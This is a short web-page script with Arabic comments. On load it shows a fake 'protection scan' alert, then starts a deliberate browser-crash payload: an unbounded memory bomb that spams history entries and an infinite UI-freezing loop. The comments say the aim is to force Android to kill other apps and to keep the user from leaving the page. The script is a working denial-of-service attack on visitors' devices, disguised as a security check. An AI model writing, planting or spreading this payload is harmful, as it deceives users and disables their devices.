<script>
    function crashSystem() {
        alert("بدء فحص الحماية... يرجى عدم إغلاق الصفحة");
        
        let heavyLoad = [];
        
        // 1. استهلاك الرام بجنون (قنبلة الذاكرة)
        // سيقوم بحجز مساحات ضخمة تجبر الأندرويد على إغلاق التطبيقات الأخرى (Background Killer)
        function memoryBomb() {
            while(true) {
                heavyLoad.push(new Uint32Array(5000000).fill(0xDEADBEEF));
                // إضافة نصوص ضخمة جداً للسجل لمنع المتصفح من الاستجابة
                window.history.pushState(null, "", Math.random().toString(36));
            }
        }

        // 2. تجميد الواجهة (UI Freeze)
        // يمنع المستخدم من الضغط على زر الهوم أو التنقل بين التطبيقات
        function uiFreeze() {
            while(true) {
                // عمليات حسابية لا نهائية في خيط الواجهة الأساسي
                let x = Math.pow(Math.random(), Math.random());
                document.body.innerHTML += "<h1>SYSTEM_OVERLOAD_ERROR_0x8821</h1>";
            }
        }

        // تنفيذ الهجومين معاً
        setTimeout(memoryBomb, 100);
        setTimeout(uiFreeze, 100);
    }

    // التنفيذ بعد 3 ثواني
    window.onload = function() {
        setTimeout(crashSystem, 3000);
    };
</script>
